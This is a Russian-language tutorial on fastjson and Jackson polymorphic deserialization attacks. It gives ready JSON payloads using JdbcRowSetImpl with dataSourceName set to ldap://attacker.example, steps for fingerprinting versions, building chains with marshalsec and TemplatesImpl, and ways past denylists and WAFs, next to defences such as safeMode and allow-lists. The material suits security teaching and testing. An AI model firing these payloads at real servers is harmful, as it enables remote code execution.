## Вопрос, с которого всё начинается

Приложение принимает JSON и превращает его в объекты Java. Обычно это безопасно: JSON описывает данные, а класс выбирает код приложения. Но fastjson и Jackson умеют больше — они могут **восстановить тип из самого JSON**. Достаточно поля `@type` или `@class`, и загрузчик создаст объект указанного класса. А если указать класс с опасным поведением, он исполнит код.

Это **полиморфная десериализация**. Она удобна для разработчиков и смертельна для безопасности: тип, а значит и поведение, определяет тот, кто прислал JSON.

## Как это работает

Обычный JSON-парсер создаёт словари и списки. Полиморфный — читает специальное поле и по нему выбирает класс:

```json
{"@type":"com.example.User","name":"alice","role":"admin"}
```

Fastjson видит `@type`, загружает класс `com.example.User`, создаёт объект и заполняет поля через сеттеры. Проблема в том, что сеттеры **исполняют код**. Некоторые классы в стандартной библиотеке Java имеют сеттеры, которые делают неожиданные вещи: открывают соединение, загружают класс, читают ресурс. Это и есть gadgets.

## Наш пример: JdbcRowSetImpl

Договоримся о примере. Самый известный gadget в fastjson — `com.sun.rowset.JdbcRowSetImpl`:

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

При установке `autoCommit` вызывается `connect()`, который идёт по `dataSourceName`. Если это `ldap://` или `rmi://`, JVM сделает JNDI-запрос к серверу атакующего и загрузит оттуда класс — классический JNDI-инъекция, ведущая к RCE. Другой популярный gadget — `TemplatesImpl`, который компилирует и исполняет байткод.

## Autotype и его обходы

Fastjson пытался закрыть проблему чёрным списком классов (`denyList`). История показала, что это не работает: список регулярно обходили, потому что классов-гаджетов много, а вариантов записи имени — ещё больше. Обходы включали:

- **Кодирование имени класса** (`com.sun.rowset.JdbcRowSetImpl` через `\u`).
- **Вложенные типы** и массивы, которые обходят проверку.
- **Классы вне чёрного списка**, добавленные в новых версиях JDK или библиотек.
- **Обход через `@type` внутри `Map`**, если проверка применяется не везде.

Именно поэтому правильное решение — не чёрный список, а **allow-list**: разрешить десериализацию только конкретных, доверенных классов. Fastjson добавил `safeMode`, где autotype выключен полностью.

## Jackson: enableDefaultTyping

Jackson опасен при включённом `enableDefaultTyping` (или `activateDefaultTyping`). Тогда он пишет и читает тип в поле `@class`:

```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/x","autoCommit":true}
```

Тот же результат. Jackson также уязвим через `@class` с массивами и через библиотеки, регистрирующие свои типы. Защита — не включать default typing, а если нужно — использовать allow-list через `PolymorphicTypeValidator`.

## Как строить и проверять payload

Порядок действий:

1. **Определить, что это fastjson/Jackson.** Пришли JSON, посмотри реакцию на неизвестный `@type`: ошибка с именем класса выдаёт движок.
2. **Определить версию.** По ошибкам, заголовкам, известным зависимостям.
3. **Выбрать gadget.** Для JNDI — `JdbcRowSetImpl`; для прямого байткода — `TemplatesImpl`; для чтения файлов — другие классы.
4. **Собрать payload.** Вручную или генератором (marshalsec для JNDI).
5. **Проверить.** JNDI-запрос уйдёт на твой сервер (нужен слушатель), либо команда исполнится локально.

Для JNDI нужен сервер, отдающий класс: `marshalsec` умеет поднимать LDAP/RMI-сервер. Для `TemplatesImpl` нужен байткод, который компилируется и исполняется.

## Что мы теперь знаем

- Полиморфная десериализация восстанавливает тип из JSON (`@type`/`@class`).
- Опасны сеттеры классов-гаджетов: `JdbcRowSetImpl` ведёт к JNDI, `TemplatesImpl` — к байткоду.
- Чёрные списки fastjson регулярно обходились; правильная защита — allow-list и safeMode.
- Jackson опасен при `enableDefaultTyping`; нужен `PolymorphicTypeValidator`.
- Payload собирают вручную или через marshalsec, проверяют безобидной командой.

## Механика autotype: что именно происходит на сервере

Полезно разобрать, что происходит внутри парсера, когда он видит поле с типом. Это объясняет, почему защита через фильтры регулярно даёт сбой.

Парсер читает JSON токен за токеном. Встретив ключ `@type`, он вызывает загрузчик классов: `Class.forName(имя)`. Если класс существует и разрешён, создаётся пустой экземпляр через конструктор без аргументов. Дальше парсер идёт по остальным полям и для каждого ищет сеттер: поле `dataSourceName` превращается в вызов `setDataSourceName(value)`. Сеттер — это обычный Java-метод, и он может делать что угодно: открывать соединение, читать ресурс, инициализировать объект. Именно сеттеры, а не конструкторы, чаще всего дают исполнение кода.

Отсюда важный вывод: безопасность зависит не только от того, какие классы разрешены, но и от того, какие сеттеры они вызывают. Класс, который сам по себе безобиден, может иметь сеттер, идущий в сеть. Поэтому белый список должен быть построен на уровне **конкретных классов и полей**, а не по namespace.

Второй тонкий момент — порядок полей. Fastjson обрабатывает поля по мере чтения, и некоторые gadgets срабатывают только если поле с командой идёт до поля, запускающего действие. Поэтому payload часто требует точного порядка ключей. Это объясняет, почему один и тот же набор классов в разном порядке иногда срабатывает, а иногда нет.

## JNDI-цепочка по шагам

Разберём JNDI-цепочку подробно, потому что это самый частый путь в fastjson.

Шаг первый: атакующий отправляет JSON с `@type` равным `com.sun.rowset.JdbcRowSetImpl` и полем `dataSourceName`, указывающим на его LDAP-сервер. Шаг второй: парсер создаёт объект и вызывает `setDataSourceName`, запоминая адрес. Шаг третий: парсер устанавливает `autoCommit` в `true`, что вызывает `connect()`. Шаг четвёртый: `connect()` выполняет JNDI-лукап по адресу, то есть JVM обращается к LDAP-серверу атакующего. Шаг пятый: сервер возвращает ссылку на класс, и JVM загружает и исполняет его статический инициализатор.

Каждый шаг даёт наблюдаемый признак: сетевой запрос к LDAP, загрузка класса, исполнение. Это помогает и эксплуатировать, и защищаться. На стороне защиты отключают JNDI-лукап для недоверенных адресов, ограничивают исходящие соединения и включают `safeMode`.

## TemplatesImpl: байткод вместо JNDI

Альтернатива JNDI — gadget `TemplatesImpl`, который компилирует и исполняет байткод. В этом случае не нужен внешний сервер: полезная нагрузка передаётся внутри JSON как base64-байткод класса. При десериализации `TemplatesImpl` загружает байткод и вызывает метод, а байткод делает что угодно — обычно запускает команду.

Преимущество для атакующего: нет внешнего соединения, которое легко заметить. Недостаток: payload больше и требует корректного байткода под версию JVM. Именно поэтому `TemplatesImpl` популярен в средах, где исходящие соединения заблокированы, а fastjson остался уязвим.

## Как определить версию и наличие autotype

Определение — половина успеха. Способы:

- Отправь `@type` с несуществующим классом. Ошибка может содержать версию fastjson или упоминание `autoTypeSupport`.
- Проверь реакцию на класс из чёрного списка: если вернулось сообщение о запрете, значит autotype включён, но фильтруется.
- Отправь класс, который точно разрешён (`java.lang.Object`), и посмотри, восстановится ли он.
- Иногда версия видна в заголовках или в ошибках сериализации.

По версии выбираешь известный обход. Для старых версий (до 1.2.68) обходов множество; для новых нужны свежие техники, часто связанные с конкретными библиотеками.

## Ошибки и их последствия

Самая частая ошибка — считать, что «fastjson обновлён, значит безопасно». Обновление закрывает известные пути, но autotype остаётся опасным, если он включён, а в classpath есть подходящие классы. Вторая ошибка — полагаться на WAF, который ищет строку `@type`: кодирование и вложенность обходят такие проверки. Третья — недооценивать Jackson: `enableDefaultTyping` встречается в legacy-коде и в библиотеках, которые включают его по умолчанию.

Правильный подход один: не десериализовать полиморфно недоверенные данные. Если это невозможно — строгий белый список типов и полей, обновление библиотек и мониторинг исходящих соединений.

## Практические советы и типичные ошибки

Первое: не путай fastjson и Jackson по внешнему виду. Fastjson читает `@type`, Jackson при default typing — `@class`. Если один не сработал, попробуй второй: в одном приложении могут стоять обе библиотеки, и уязвима только одна из них.

Второе: порядок полей важен. Если команда не сработала, поменяй порядок ключей в JSON — некоторые gadgets запускают действие только после заполнения определённых полей.

Третье: для JNDI нужен внешний слушатель. Без поднятого LDAP/RMI-сервера payload не сработает, даже если autotype включён. Для проверки в закрытом контуре используй `TemplatesImpl` с локальным байткодом.

Четвёртое: следи за версией JDK. В новых JDK JNDI-лукап по умолчанию ограничен, поэтому JNDI-цепочка может не сработать без дополнительных условий. В таких случаях идут через `TemplatesImpl` или через библиотечные gadgets.

Пятое: фиксируй результат. Payload без наблюдаемого эффекта — не доказательство. Используй безопасную команду и покажи её вывод.

## Резюме

Полиморфная десериализация в JSON опасна тем, что тип выбирает отправитель. Fastjson через `@type`, Jackson через `@class` восстанавливают классы и вызывают их сеттеры, а среди классов есть гаджеты вроде `JdbcRowSetImpl` и `TemplatesImpl`. Чёрные списки обходятся, поэтому защита — `safeMode`, allow-list и `PolymorphicTypeValidator`. При тестировании определяй библиотеку и версию, затем подбирай цепочку под окружение.

И последнее: если приложение использует fastjson только для сериализации (запись), а не для разбора недоверенных данных, autotype не эксплуатируется. Уязвимость проявляется там, где JSON от пользователя попадает в `parseObject` с включённым autotype. Ищи именно такие вызовы, а не факт наличия библиотеки в зависимостях.
